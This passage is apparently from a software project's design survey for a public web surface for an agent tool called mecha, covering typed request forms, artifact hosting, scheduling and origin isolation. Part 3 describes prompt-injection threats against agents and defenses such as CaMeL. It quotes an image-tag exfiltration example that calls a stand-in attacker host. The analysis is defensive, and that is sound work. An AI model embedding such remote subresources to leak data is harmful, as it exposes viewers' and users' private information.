# The public surface

Where mecha meets the world: artifacts, reports, notebooks, a booking page,
and a typed API for the things people currently send by email.

Consolidated 2026-08-05 from four research sessions run the same week —
artifacts and where they live; hosting and origin isolation; scheduling and
group coordination; and the front door as a typed request API. Those four
documents (`ARTIFACT-RESEARCH`, `HOSTING-RESEARCH`, `SCHEDULING-RESEARCH`,
`FRONTDOOR-RESEARCH`) are superseded by this one and their recommendation
identifiers (`A*`, `H*`, `F*`) are retired in favour of the single `P*` list
below.

**Nothing here is built.** This is the survey and the argument. The decisions
taken off the back of it live in
[`PUBLIC-SURFACE-DESIGN.md`](PUBLIC-SURFACE-DESIGN.md) — read that for what is
actually being built; read this for why. A reader finding either cold should
not go looking for `mecha serve` in the source.

**Venue key**: ✅ peer-reviewed · 📄 preprint · 📰 vendor/blog · 📘 spec or
standards body · ⚖️ law or regulation · 🔮 folklore (no measurement exists).

---

## The one-sentence answer

Everything here is one primitive seen from two sides — **a typed, versioned,
schema-described object crossing the boundary between you and the world,
staged for human review in both directions** — so build one public origin with
four verbs (`publish`, `read`, `write`, `drain`), make the *request type* the
unit of extension so a single manifest emits the form, both validators, the
agent-facing tool declarations and the triage frame, keep the schema rather
than anyone's prose as the only thing that ever decides what happens next, and
host it on a **cheap machine that is not yours**, reached only by mecha
pushing to it and polling it, so that no request from the internet ever
reaches the process that holds two OAuth refresh tokens and a provider key.

The claim underneath it, and the one worth arguing about: **the value is not
the AI. It is that a typed request has a state machine and an email does
not.** Every model call in this design is optional garnish on a mechanism that
works without one — which is also why it is safe to point at the open
internet.

---

## Part 1 — The shape: one boundary, two directions, four verbs

The asks look heterogeneous. They are not:

| Ask | Direction | Object |
|---|---|---|
| Book a meeting | in | typed request + atomic claim |
| Request a letter | in | typed request |
| Media / speaking invitation | in | typed request |
| Apply to the lab | in | typed request + attachments |
| Ask about my research | in | typed request, *possibly* answered from a corpus |
| A research report | out | published bundle, `static` |
| A blog post | out | published bundle, `static` |
| A data visualisation | out | published bundle, `interactive` |
| A marimo notebook | out | published bundle, `compute` |
| Tomorrow's availability | out | published bundle, regenerated on a trigger |

Two shapes, four verbs, and the verbs are the thing to hold fixed so that
*which host* stays a deployment decision rather than an architecture:

```
publish   mecha ──> origin      write a bundle of static bytes under an id
read      world ──> origin      serve them, under a policy, with a CSP
write     world ──> origin      one narrow, deterministic, model-free endpoint
drain     mecha ──> origin      poll for what the world wrote, and delete it
```

Artifacts use `publish` + `read`. The front door and scheduling use all four.
That is the whole reason these belong in one project — not "they are all web
pages" but **one gate, crossed in two directions, with the same review
discipline on each side.** Outbound is the outbox: `publish` is
`external_send`, so it stages. Inbound is the drain queue, read later by a run
that is read-only, taint-armed and outbox-routed. The symmetry is exact and it
is the thing to protect.

### What mecha already has

The striking thing is how little is missing. This is mostly a new arrangement
of parts that exist:

| Need | Already exists |
|---|---|
| Run something on a schedule, unattended | `trigger.rs` + `cron.rs` |
| Never send without a human | the outbox |
| Refuse exfiltration after reading hostile text | the interlock, taint on `Conversation` |
| A durable store with atomic writes and a ledger | triggers, outbox, learning — three instances of one pattern |
| Calendar and mail read/write across accounts | `mecha-mail`'s unified surface |
| IANA-correct time, DST in both directions | `[agent] timezone`, `cron.rs` |
| An HTTP server | `tiny_http`, already a dep — used for 30 seconds during OAuth |

A scheduling request waiting on replies **is a trigger**. A booking
confirmation **is an outbox item**. The public page's data **is a file a
trigger regenerates**. One thing is deliberately absent and must be designed
around: `ask_user` is never registered in a trigger run, because it is only
ever provided by a front-end that owns a human. Every decision an unattended
run cannot make alone goes to the outbox, not to a prompt.

---

## Part 2 — The unit of extension: one manifest, six surfaces

### The insight

📰 The schema-driven-forms literature has converged on a claim that is
unremarkable in web development and quietly transformative here: a JSON Schema
can be the **single source of truth** from which the form UI, the client
validation, the server validation, the API contract and the storage shape are
all derived. Remote's engineering write-up on the JSON Schema blog is the
load-bearing case study — schemas authored server-side validate payloads, and
clients consume the same schemas to render forms and tables, with the reported
payoff being fewer support tickets from inconsistent data.

The agent-era addition — which is what makes this worth building in 2026 and
not 2019 — is that the *same* schema is also a tool declaration. 📘 MCP tools
are `{name, description, inputSchema}`. 📘 WebMCP tools registered through
`navigator.modelContext` are a name, a natural-language description, and JSON
Schemas for inputs and outputs. 📘 A2A skills on an Agent Card are the same
triple again. And a model asked to *triage* a request wants exactly one more
schema, for its verdict.

So one manifest, six surfaces:

```
                        ┌── JSON Schema ──────── validate at the edge and at home
                        ├── HTML form ────────── the UI (Part 9: plain, semantic,
  request-type manifest │                        WCAG 2.1 AA)
   (TOML, versioned) ───┤── WebMCP tool ──────── the visitor's own agent fills it
                        ├── MCP tool ─────────── any agent, anywhere, submits
                        ├── A2A skill ────────── /.well-known/agent-card.json
                        └── triage frame ─────── the structured verdict mecha fills
```

Add a seventh, and it is the one that pays the rent: the manifest also carries
the **policy** — capacity cap, season, required verification level, SLA, which
fields are third-party personal data, and the immediate templated
acknowledgment.

### What a manifest looks like

Sketch, not a spec — the point is the field list, not the syntax:

```toml
[type]
id = "letter"
version = 3                      # schemas version; old records must still parse
title = "Request a letter of recommendation"
description = "For students and postdocs I have supervised or taught."

[policy]
verification = "email"           # none | email | institutional
season = "2026-09-01/2026-12-15" # the form closes itself outside this
capacity = 8                     # per season; auto-declines with dignity at 9
sla_days = 3                     # what the acknowledgment promises
ack = "templates/letter-ack.md"  # sent by the origin, immediately, no model
review = "batch"                 # groups with its siblings in the outbox
retain_days = 400                # Part 9 — GDPR retention as a field

[[field]]
name = "relationship"
type = "enum"
options = ["took my course", "research assistant", "advisee", "other"]
required = true

[[field]]
name = "deadline"
type = "date"
required = true
min_notice_days = 21             # deterministic decline below this. No model.

[[field]]
name = "ferpa_consent"           # Part 9 — this is why it is a field
type = "bool"
required = true

[[field]]
name = "context"
type = "text"
max_len = 2000
untrusted = true                 # rides `.from_outside()` into any conversation
```

Three properties of that object are the whole design:

- **Every decision expressible as arithmetic is made by arithmetic.** Season,
  capacity, minimum notice, required fields, attachment size — all
  deterministic, all before any model sees anything. A November flood of
  letter requests is bounded by `capacity = 8`, not by your patience.
- **`untrusted` is a per-field label, not a per-tool one.** mecha already
  distinguishes what a tool *can* return (`Capabilities`) from whether a
  particular result actually came from outside (`ToolOutput::external`). This
  is that distinction pushed one level finer: `relationship` is an enum the
  form chose from a fixed list and carries no payload; `context` is a
  stranger's prose. Marking them differently is free, and it is what lets a
  triage prompt quote the enum and quarantine the paragraph.
- **The type is chosen by the form, never inferred from the prose.** See
  Part 3. This is the single most important sentence in the document.

### Where request types live

Same rule as triggers, for a stronger reason. `[[hook]]`, `[[mcp]]` and
`[[subagent]]` are declarable in a project's `mecha.toml`, which is a file that
arrives with a cloned repository; a trigger declared there would be a cron slot
handed to a stranger. A **request type** declared there would be a public form
on your domain, in your name, collecting other people's personal data.
`~/.mecha/frontdoor/types/`, global only, `Config::load_global()` — exactly as
a trigger run already does.

The store follows the rules the other three stores already follow: one pretty
JSON per item, temp-sibling-and-rename, advisory flock never held across
anything slow, and a ledger that answers "why didn't that happen".

```
frontdoor/types/<id>.toml       the manifest above
frontdoor/requests/<id>.json    a drained request, with its verification state
scheduling/windows/<name>.toml  bookable window (Part 7)
scheduling/links/<token>.json   an issued booking link: window, audience, expiry
scheduling/holds/<slot>.hold    O_EXCL create is the mutex; mtime is the TTL
ledger.jsonl                    every issue, claim, expiry, book, decline, skip
```

---

## Part 3 — Structure *is* the security model

### The threat, stated once

📰 The security write-ups converge on one sentence: nearly every major prompt
injection incident of the last two years — Slack AI, M365 Copilot, Cursor,
GitHub MCP — shares one shape: **an agent with access to private data,
exposure to untrusted content, and the ability to communicate externally.**

That is mecha's trifecta interlock, arrived at independently, already
implemented, and already enforced *ahead* of the human approver — because a
human clicking "yes" is what an injection is trying to engineer. What the
public surface adds is a **higher-quality injection source than anything that
came before**: a stranger who chooses the exact bytes, knows an agent will read
them, and pays nothing to try again.

The structural answer is not a better prompt. It is a narrower channel.

### 📄 The design-pattern literature says the constraint is the defense

*Design Patterns for Securing LLM Agents against Prompt Injections*
(arXiv:2506.08837) catalogues six patterns and states the governing principle
bluntly: **once an agent has ingested untrusted input, it must be constrained
so that input cannot trigger consequential actions** — achieved by deliberately
limiting the agent's ability to perform arbitrary tasks. Two are relevant here:

- **Action-Selector**: the agent may only select from a fixed, pre-enumerated
  set of actions. The most secure and least flexible pattern in the survey.
- **Context-Minimization / input isolation**: untrusted text is removed from
  the context that decides what to do.

📄 Google DeepMind's **CaMeL** is the industrial-strength version — a
privileged LLM that never sees untrusted data emits a program; a quarantined
LLM parses untrusted data but holds no tools; capabilities and control-flow
integrity are enforced by an interpreter around both. It defended against ~67%
of AgentDojo's injections and drove successful attacks to zero for some
models. The cost is reported and real: **roughly 2.7–2.8× the tokens** of
ordinary tool use.

**A typed intake form is the Action-Selector pattern, obtained for free.** The
requester is not writing a prompt; they are picking a request type from a fixed
list and filling enumerated fields. The control plane — which type, which slot,
which acknowledgment, whether the capacity cap is hit — is computed entirely
from schema-constrained values. The data plane — the 2000-character `context`
field — is prose that never participates in a decision. That is CaMeL's
control/data separation without CaMeL's interpreter and without its token
multiplier, because **the schema did the quarantining at the moment of typing
rather than a second model doing it afterwards.**

### The rule that makes it hold

> **A stranger's free text may become the *content* of a decision. It may
> never become the *decision*.**

Concretely: an injection in a letter request's `context` field cannot turn it
into a speaking invitation, cannot move it past the capacity cap, cannot change
the acknowledgment that goes out, and cannot cause an outbound send — the
routing came from the form and the send is staged. The best it can achieve is a
paragraph of hostile text inside a draft a human reads before release. That is
the outbox's original argument, applied to the inbound direction.

Two failure modes this rules out, both otherwise near-certain:

- **Type inference from prose.** It is *very* tempting to offer one box that
  says "what do you need?" and let a model route it. That single choice
  converts an Action-Selector system into a free-form one and hands routing to
  the attacker. If a router is ever wanted, it must *propose* a type and a human
  or a deterministic rule must confirm it — never the model's choice executing
  directly.
- **A free-text field that names a URL, a file or an address and is then used
  as one.** Links and attachments in a request are data to be *shown*, never
  resolved. A URL a stranger typed must not be fetched by a run that also holds
  mail access; that is the trifecta, armed by a form.

### The three threats of publishing, which are easy to collapse and shouldn't be

1. **The publish moves data off the machine.** A briefing distilled from two
   private mailboxes and auto-published is exfiltration with good typography.
   The interlock exists for exactly this, and for a mail-reading run it is
   *always* armed — mail reads arm both legs by design.
2. **The page is itself an exfiltration vehicle**, firing in the *viewer's*
   browser rather than the agent's process. The documented pattern is a remote
   subresource — `<img src="https://attacker/?d=…">` — the same class as the
   markdown-image and link-preview attacks in the literature. No interlock
   reaches there. Only the host's CSP does.
3. **The viewer is not the author.** A public page summarising your inbox is a
   privacy incident with no attacker anywhere in the story.

The first resolves at no cost because the machinery exists: **a publish tool is
named in `[outbox] tools`.** The agent calls `artifact_publish`, the loop
stages it, nothing leaves, and `mecha outbox show` displays exactly what would
go up — including the conversation's taint snapshot, which every staged item
already records. Staging deliberately skips the interlock because staging sends
nothing, so a briefing *can* draft its own page every morning with the trifecta
armed, and publication is gated on a person. The second is Part 6. The third is
a policy question no mechanism answers for you.

### 📄 And the reason learning is not in this loop

A learned rule outlives the conversation that produced it and rides in every
future run's system prompt inside the cached prefix — a longer-half-life
injection path than anything the interlock guards. Provenance already gates
that: reflections carry an `Origin` classified from the transcript's recorded
taint, and `mecha learn` excludes non-clean ones structurally. A public
surface makes that guarantee load-bearing rather than theoretical, because it
is the first channel where a stranger writes into the corpus on purpose.
Nothing needs to change; it is worth knowing why.

---

## Part 4 — Who is asking, and the token faucet that moved one hop

"No model on the request path" is right and it works. But notice where the cost
went: **`drain` spends tokens per request.** A thousand junk submissions cost
nothing at the edge and a thousand triage runs at home. The faucet moved one
hop and is still pointed at you.

Three defenses, in increasing order of value:

**1. The schema bounds the blast radius.** Bounded field count, bounded
lengths, capped attachments. A junk request is small and cheap to classify.
Free, and already implied by Part 2.

**2. Edge rate limiting and proof-of-work.** 📰 Cloudflare Turnstile is
invisible, privacy-preserving and free; self-hosted proof-of-work (Anubis, Cap)
avoids a third party entirely, with the caveat that Anubis ships a low default
difficulty a determined bot solves easily. Either is a reasonable per-type
control and neither needs an account.

**3. Email round-trip verification, which is the one that matters.** 📰 A magic
link is a single-use URL sent to the address given. Here it is not
authentication — there is no account to log into — it is **a binding between
the request and a mailbox someone controls**, and it buys three things at once:

- Drive-by spam dies: it requires a live mailbox and a click.
- **The token spend is gated.** Unverified submissions expire on the public box
  and are deleted, never polled, never seen by a model, never costing a cent.
- "Who is asking" becomes a *fact* rather than a claim, which is what makes a
  letter request or a lab application worth acting on at all.

The known weaknesses are ordinary: the mail lands in spam (SPF/DKIM/DMARC —
already solved for mecha-mail's sending identity), the link is a bearer secret
in email, and repeated requests mint multiple live tokens. Single-use,
short-expiry, one live token per address per type covers it.

This is the same discipline as the outbound share link (below), pointed
inbound. **One mechanism, two directions**, which is the third time that
sentence is the right answer in this document.

### Capability URLs, done properly

📘 Measured against the W3C TAG's *Good Practices for Capability URLs* — the
2014 note still used as the reference for unguessable share links — the entire
artifact-hosting field is missing the same three things:

- **Expiry.** A share link that works forever is a credential that never
  rotates.
- **Per-recipient URLs.** One URL per recipient is what makes *targeted*
  revocation possible; a single shared secret can only be revoked for everyone.
- **Leak-awareness.** URLs travel in referrers, history, chat logs and
  screenshots. CSPRNG identifiers, server-side verification, expiry — cheap to
  implement, and nobody in this space does all of it.

Three fields and a check. It is the entire difference between this and every
native artifact host surveyed, and it is the same three fields the inbound
verification token needs.

An institutional verification tier is worth naming and not building: an `.edu`
address confirmed by round trip is a weak-but-real signal, and a real one (SSO,
ORCID) is a lot of work for a small number of requests. `verification =
"institutional"` should exist in the manifest as a value nothing implements
yet, so the schema does not have to change on the day it does.

---

## Part 5 — The reply: tiers, structured verdicts, batch review

### Three tiers, and most requests should never reach a model

```
tier 0   deterministic, at the origin, instant, zero tokens
         → templated acknowledgment; decline if cap/season/notice fails;
           slot confirmed if it is a booking (atomic claim)

tier 1   deterministic, at home, zero tokens
         → file it, ledger it, group it with its siblings, surface it in the
           queue sorted by deadline

tier 2   an agent run: taint-armed, read-only, outbox-routed
         → draft the reply, propose a decision, pull the context worth having
           (past correspondence, the calendar, the knowledge graph)
```

The confirmation comes **immediately, from the origin, from a template with no
model output in it** — the manifest's `ack` field. A stranger who submits a
form and sees nothing for a minute assumes it broke. Note what read-only does
*not* block: an outbox-routed reply still stages, because staging executes
nothing. As with overnight inbox triage, the safe shape is also the useful one.

### Structured verdicts, with the scratchpad first

📄 The structured-output literature has a specific, actionable finding: strict
format constraints degrade reasoning — reported at 10–30%, and up to 27 points
on maths benchmarks — and **schema field ordering is a significant driver**,
because a schema that places the answer before the reasoning forces the model
to commit before it thinks. The recommended pattern is hybrid: free-form
reasoning first, constrained generation only for the final object.

So the triage verdict schema puts `reasoning` first and `decision`, `priority`,
`draft_reply` after it. Two lines of design, invisible until someone measures
it, and mecha already has the rig to measure it.

### 📰 Batch review is a gap in the outbox as it stands

The human-in-the-loop guidance is consistent: **design for batch review from
day one** — an agent generating a hundred actions overnight needs a batch
interface, not a hundred popups — group similar actions, allow bulk
approve/reject, and show each proposed action *with its context and the agent's
reasoning*, because reviewers without context approve as fast as they can
click.

mecha's outbox is per-item today (`list / show / edit / send / reject`). That
is right for one email and wrong for eleven letter acknowledgments in the first
week of November. The manifest already carries the grouping key (`review =
"batch"`, plus the type id). Concretely: `mecha outbox --group type`, and a
`send --group letter` that holds the lock across the batch the way `send`
already holds it across one execution.

This is **a change to existing machinery that the public surface forces**, not
a new feature — those are the ones discovered late.

### The one-round-trip rule

📄/📰 x.ai's "Amy" (2015–2021) and Clara Labs both put an assistant *inside the
email thread* to negotiate. The retrospective critique is structural rather
than about model quality: **email is the wrong channel architecture for
autonomous negotiation** — unbounded latency, no state the counterparty can
see, no way to make an offer expire, and every misunderstanding costs a full
round trip with a human's attention attached. 📄 The negotiation literature
adds that "cold" bots hit more impasses and build less rapport than warm ones;
an agent emailing your colleagues in your name is doing reputational work, not
clerical work.

Every surviving product did the same thing instead: **collapse the negotiation
into one round trip by sending a link.** The link carries the state, shows the
option set, and can expire.

**mecha should never negotiate by email.** It may *send* a link and it may
*nudge* about one, both staged through the outbox. That is the whole external
protocol, and it generalises past scheduling: when a request needs a follow-up
field, the reply carries a link back into the same typed flow rather than a
question in prose.

---

## Part 6 — The outbound half: artifacts, content classes, notebooks

### 📰 What the field does, and the three constraints that generalise

**Claude Code Artifacts** (Anthropic, June 2026) is the closest prior art, and
the constraints are the interesting part. Reported from secondary sources
rather than product documentation — treat the details as indicative, and check
the product before depending on any of them:

- The agent **writes an HTML or Markdown file into the project, then publishes
  it**, so the artifact is a *view* of something you still own and never the
  only copy.
- Hosted on a `claude.ai` URL, with private / organisation / public-link
  visibility tiers. (Sources disagree about the public tier; one of them sells
  artifact-sharing software.)
- **A strict CSP**: no external scripts, styles or images, no `fetch` or
  WebSocket, no backend, no stored form input, no multiple routes, 16 MiB
  ceiling.
- Version history and a gallery; republishing updates the same URL.
- An artifact pulling live data through a connector **cannot be shared
  publicly at all**.

**Codex Sites** (OpenAI) is workspace-only with in-workspace annotation.
**Cursor shared canvases** are public links with no comments or analytics. And
there is a small market of third-party products that exist purely to add
comments, analytics, custom domains — and to *re-host Claude artifacts
elsewhere*. The existence of that last category is the tell: **the native
artifact hosts are all closed loops.** You publish into the vendor's namespace
under the vendor's identity model, and if you want a different permission shape
you leave.

Three of those constraints are load-bearing and generalise:

- **The CSP is the security model, not a polish item.** An agent-authored page
  is untrusted markup, and it has to be enforced by the host, because asking
  the model not to emit a tag is not enforcement.
- **Live data and open publication are mutually exclusive**, by construction
  rather than by warning.
- **No backend, no routes.** A self-contained page is the shape that survives
  being moved, which is what makes it portable enough to be worth generating.

### The read-back problem is separate and simpler

"Can an agent read what a scheduled run produced?" is not a hosting question.
A briefing written by a `notify` shell command into `~/.mecha/briefings/` sits
outside every path jail, so no agent can read it. The fix is not a new tool: it
is writing the artifact **inside the run's own workspace**, where `fs_read`
already reaches it. Artifacts land where the agent can already go rather than
punching a hole in the jail; the ledger records the path and the `/triggers`
detail view links it.

### 📘 Notebooks force the CSP into classes

Serving marimo notebooks breaks the single-CSP model, and how it breaks it is
the most concrete finding in this document.

- Notebooks export to a self-contained WASM bundle (`marimo export html-wasm …
  --mode run` for read-only with code locked, `--mode edit` for editable), and
  self-hosting is "serve the HTML plus the `assets` directory over HTTP" — no
  server, no Python process. Pleasingly, **that means serving a notebook is
  still just `publish` of a static bundle**: no new verb, no new posture, no
  process to supervise.
- But it runs Pyodide, and WebAssembly instantiation is blocked by any CSP with
  a `script-src`/`default-src` unless it grants `wasm-unsafe-eval` (or,
  historically, the far worse `unsafe-eval`). `wasm-unsafe-eval` shipped in
  Chrome 97 and Firefox 102 and permits `WebAssembly.compile`/`instantiate`
  while still forbidding `eval` and `new Function`.
- Pyodide's threading path additionally wants `SharedArrayBuffer`, which
  requires **cross-origin isolation**: `Cross-Origin-Opener-Policy:
  same-origin` plus `Cross-Origin-Embedder-Policy: require-corp` — headers that
  also change what the page may embed.
- marimo's own documentation is silent on all of this, and its islands example
  loads `@marimo-team/islands` **from `cdn.jsdelivr.net`** — precisely the
  external subresource the artifact CSP forbids.

Three consequences, none of which is "don't serve notebooks":

- **Notebooks are a different content class with a different CSP, and therefore
  a different origin.** Granting `wasm-unsafe-eval` on the artifact origin
  would weaken *every* artifact to accommodate the one class that needs it —
  the silently-degrading-sandbox shape this project keeps naming.
- **Vendor the assets.** Whatever the exporter emits, the publish step rewrites
  CDN references to local copies and *fails* if any survive. That check is a
  unit test, it is cheap, and it is the difference between "we set a CSP" and
  "the CSP holds."
- **`--mode run`, never `--mode edit`, for anything public.** Editable is
  arbitrary Python in the viewer's own browser — harmless to you, but the page
  stops being a record of anything, and a link you sent someone now shows them
  whatever they typed.

### The content-class table

| Class | Contains | CSP | Origin |
|---|---|---|---|
| `static` | markdown → HTML: reports, blog posts, briefings | no script at all; no external subresources | artifact origin |
| `interactive` | charts, small JS | inline script by hash; no network, no eval | artifact origin |
| `compute` | marimo / Pyodide notebooks | + `wasm-unsafe-eval`; COOP/COEP if threads | **separate origin** |
| — | downloads, data, images | `Content-Security-Policy: sandbox`, `nosniff`, `Content-Disposition: attachment` | either |

📘 `Content-Security-Policy: sandbox` on inactive content gives a unique opaque
origin without needing another domain, which is the cheap way to handle the
fourth row. The class also decides the review burden, which is the useful part:
a `static` report is text a human skims; a `compute` notebook is code, and the
reviewer should be told so. The manifest carries the class, the publish step
enforces the policy, the outbox shows it.

---

## Part 7 — Scheduling: one engine, two front doors

### Three problems, not one

The distinguishing axis is **whose calendar can you read**, and it decides
everything downstream:

| | Can read their calendar | Machinery needed |
|---|---|---|
| **Book me** (youcanbookme) | only mine | publish + atomic claim; no negotiation |
| **Internal group** (colleagues) | everyone's free/busy | pure optimisation; nobody is ever asked |
| **External group** (when2meet) | nobody's but mine | elicitation, tracking, nudging, fairness |

The middle row is the one people skip and the one that is nearly free:
Microsoft Graph's `getSchedule` and Google's `freeBusy.query` both return other
people's busy intervals inside an organisation, so for a meeting with five
colleagues **there is no poll to run** — the answer is a computation.

### The gap in mecha-mail, which is the cheapest large win here

`mecha-mail` has no free/busy call at all. **`calendar_freebusy`** on the
unified surface — `attendees`, a window, and no `account` (fan out, merged) or
one — would make "find an hour next week that works for me, Sarah and Tal, and
put it on the calendar" a solved request the day it lands, with no other work.

Three decisions to make deliberately:

- **Do not wrap `findMeetingTimes`.** It applies Microsoft's own business logic
  to *suggest* times and is delegated-only, so using it would make the quality
  of mecha's answer depend on which provider the account happens to live on.
  That breaks the crate's founding rule — the model names an account, never a
  provider — in the most damaging possible place, because the difference would
  be invisible in the output. Use `getSchedule` and `freeBusy.query` for raw
  intervals and intersect **once**, in mecha. Graph's limits (20 mailboxes per
  request, 62-day window) belong in the tool schema and the chunking code, not
  discovered at runtime.
- **Ask for availability, never details.** Both APIs can return event subjects
  and organisers for colleagues who share more than free/busy. Requesting only
  intervals means the tool returns numbers and no prose, which keeps it out of
  the untrusted-input class entirely. *Asking for less makes the capability
  label narrower*, which is worth more than seeing what the conflict is called.
  It stays `private_data` and is not `open_world` — the query goes only to the
  provider that already custodies the calendar, the same reasoning that puts
  `mail_search` on one side of that line and `http_fetch` on the other.
- **A colleague whose free/busy you cannot read is a normal outcome**, not an
  error. Return what you have, name who was opaque.

### One engine, no model in it

```
availability(windows, busy[], holds[], bookings[], now) -> [Slot]
```

Pure, deterministic, unit-testable, never sees a token. It takes bookable
windows, merged busy intervals from every account, outstanding holds, existing
bookings, buffers, minimum notice and per-day caps, and returns slots.

**The model never does interval arithmetic.** This is the same call the project
already made for cron: every available crate spoke Quartz's dialect where field
one is *seconds*, so `0 7 * * *` parsed as something other than 7am rather than
failing, and a scheduler that silently fires at the wrong time is the worst
shape of bug this project keeps finding. An LLM doing timezone maths across a
DST boundary is that bug with a friendlier voice — the times stay internally
consistent and read as correct.

Store instants in UTC plus each participant's IANA zone and render at the edge.
An offset is wrong twice a year, and for scheduling it is wrong *in the
future*, which is when it matters.

📘 **RFC 7953 (Calendar Availability)** already specifies the bookable-window
semantics: `VAVAILABILITY` publishes recurring blocks of *available* time with
exceptions, evaluated by computing available time and then overlaying
`VEVENT`/`VFREEBUSY` to block it out. Worth adopting as the internal model even
if nothing ever speaks CalDAV — "office hours Tue/Thu 2–4, except the week of
the 20th" gets a definition you didn't invent, and `.ics` export comes free.

What the model *is* for: deciding a prospective grad student gets the 30-minute
window and not the 15, noticing that moving Thursday's meeting is cheap and
Friday's is not, writing the email, and saying what a slot *costs*.

### 📄 Completion is not quality — CalBench

*CalBench: Evaluating Coordination–Privacy Trade-offs in Multi-Agent LLMs*
(arXiv:2605.09823) generates tasks backwards from a known-feasible witness so
OR-Tools' CP-SAT gives the optimal cost and every run has ground-truth regret.
Four findings, each of which changes a decision:

- **Feasibility, efficiency and equity are independent failure modes.** Models
  booking similar numbers of meetings incurred wildly different excess cost. A
  scheduler that always finds *a* time and routinely picks the one costing
  someone their afternoon is a bad scheduler that scores 100%.
- **Message volume is a weak proxy for coordination quality.** The model
  sending the fewest messages per meeting achieved the lowest excess cost.
- **Privacy-by-silence buys unfairness.** The model with the lowest leakage
  rarely mentioned its own constraints (6.3% cost disclosure vs 29.2%) and
  scored *worst* on burden fairness — teammates could not allocate fairly with
  no idea what anything cost. **The thing to disclose is cost, not
  availability.** "I'm free Thursday but it means moving a lab meeting" is the
  sentence that makes group scheduling work, and exactly the sentence a naive
  free/busy-only agent cannot say.
- **Uniform-cost scenarios are saturated** (most models >83%); differences
  appear only when some conflicts are expensive to move. A design validated on
  "everyone is free or busy" is validated on the easy half.

The load-bearing lesson is the oracle itself: CP-SAT is *in the benchmark*
because the optimisation is not the model's job. The model's job is elicitation
and communication. 📄 *Multi-User LLM Agents* (arXiv:2604.08567) and
📄 *GroupTravelBench* (arXiv:2605.25200) make the complementary point — agents
are graded on *querying* rather than assuming, and the gap is multi-party
bookkeeping rather than reasoning. Read that as a storage requirement: "who has
replied" outlives a context window, a session and a crash. A scheduling request
is a **durable object with a lifecycle**, in the same family as a trigger or an
outbox item — not a conversation.

### Double-booking, at the scale you actually have

The system-design literature is unanimous and boring: availability check and
claim must be **atomic**, and a multi-step flow needs a **provisional hold with
a TTL** so an abandoned booking frees itself. At one person's volume the
filesystem is the primitive: an `O_EXCL` create of `holds/<slot>.hold` is the
mutex and the mtime is the TTL. Same discipline the outbox and trigger stores
already use, no new dependency, and it fails in a way you can inspect with
`ls`. On a platform, use a real transaction — see the KV trap in Part 8.

### Group scheduling, tiered

1. **Everyone's free/busy readable** → compute, propose, book. Nobody is
   polled. This is `calendar_freebusy` plus the engine, and for internal
   meetings it is the whole product.
2. **Some readable** → poll only the opaque ones, pre-seeded with the slots the
   readable ones already survive. A three-option poll instead of a grid is a
   different quality of ask.
3. **Nobody readable** → a when2meet-style grid at a link, one round trip.

Ranking must optimise, not just intersect — per CalBench, an agent reporting
feasibility while quietly imposing cost is failing invisibly. At this scale a
hand-rolled weighted scan (cost of displaced items, participants
inconvenienced, fairness across past meetings from the ledger) is worth more
than a solver dependency. Surface the top three **with reasons**.

Nudging is a trigger. Closing is a trigger. Both stage through the outbox.

### 🔮 Agent-to-agent scheduling is not real yet

The 2026 vendor writing about an "Agentic Handshake" — two calendars exchanging
encrypted availability and settling sub-second with no human — describes
nothing shipped and nothing measured. 📄 arXiv:2606.31498 catalogues what MCP,
A2A and ACP *cannot* express, notably the governance and authorization
properties you would need before letting a stranger's agent negotiate against
your calendar. **Do not build for this.** If it arrives it arrives as another
front door onto the same engine, which is an argument for keeping the engine
free of any assumption about who is asking.

### The alternative worth taking seriously: don't build the booking page

**Cal.rs** (AGPL-3.0) is a self-hostable Cal.com equivalent as a single Rust
binary — Axum + SQLite in WAL mode + Minijinja, no Node, no Postgres. It syncs
CalDAV, Google over OAuth2 and Exchange over EWS with RFC 6578 delta sync,
expands RRULEs, and computes availability from rules + synced events + existing
bookings + buffers + minimum notice. That list is *exactly* the boring half of
this section, and it is the half that is easy to get subtly wrong.

Two things to know. **AGPL-3.0**: running it as a separate process mecha talks
to over HTTP creates no derivative work; vendoring any of it into mecha (MIT)
does. And it solves the row you care least about — the one-sided booking page —
while doing nothing for group scheduling, which is the part with no product and
real research behind it.

**Try it for the booking page first, spend the saved time on the group tiers,
and keep the availability engine in mecha regardless**, because tier 2 needs it
and Cal.rs will not give it to you.

---

## Part 8 — Where it lives

### The axis that decides everything

Not "cloud vs self-hosted". The question is **does a request from a stranger
cause code to run on the machine that holds my credentials**, and there are
exactly three postures.

**Posture L — Listen.** A port open at home, or forwarded through the router.
Rejected without much argument: the only option that also makes you think about
your router, a dynamic IP and certificate renewal.

**Posture T — Tunnel.** Cloudflare Tunnel, Tailscale Funnel, Pangolin, ngrok.
The connection is initiated *outbound*, so there is no port forwarding and no
inbound firewall hole, and everyone describes this as the secure option. It is
secure *about the firewall*, and the firewall was not the interesting part. **A
tunnel still delivers stranger-controlled requests to a process running on your
machine.** The blast radius of a bug in that process is the whole box:
`~/.mecha/` with the mail tokens, the provider keys in the environment, the
learning store whose rules ride in every future prompt's cached prefix, and the
workspace the path jail is anchored to. The firewall being closed is not
consolation when the thing you invited through it is a request handler you
wrote last week. There is an institutional version of the same point: a lab GPU
box is not solely yours, and standing up public ingress on shared research
hardware is a policy question before it is a technical one.

**Posture P — Push–pull.** mecha **pushes** artifacts and availability up to a
public box and **polls** it for anything the world left behind. Every
connection is initiated from home, outward. The public box never initiates
anything, never holds a key that reaches home, and never receives a request it
can forward home. The attack surface of the home machine is *unchanged by
shipping this feature*, which is a very strong thing to be able to say. The
cost is latency: a booking is visible after one poll interval, and the trigger
daemon already loops once a minute.

**Posture P is the recommendation**, and everything below assumes it.

### The credential gradient

| | Holds | If fully compromised |
|---|---|---|
| **Home** | Gmail + Graph refresh tokens, provider key, the learning store, every transcript, the path-jail root | Catastrophic and quiet — the learning store is a write path into every future prompt |
| **Public box** | published bytes, a queue of pending requests, a TLS cert | Someone reads what you already published and forges requests. Embarrassing. Rebuildable in an afternoon. |

Design so the second row can be assumed lost. That is not a metaphor: the
public box gets **no key, no token and no route** that reaches home, which is a
property you can verify by reading one `authorized_keys` file.

### The hazard that only exists when you combine the features

An agent-authored page is untrusted markup. Now add a booking page. If both
live on `mecha.example.com`, a hostile or injected artifact is same-origin with
the thing that takes bookings: it can read what the booking page stores,
rewrite the availability a visitor sees, and post as that visitor. **Two
features that were each acceptable become a vulnerability when they share an
origin.**

📘 web.dev's guidance on hosting user data gives the fix:

- **Serve untrusted content from a separate registrable domain** — the classic
  sandbox domain (`examplecontent.com`, not `content.example.com`) — because
  cookies are scoped by domain and a subdomain can set cookies on its parent,
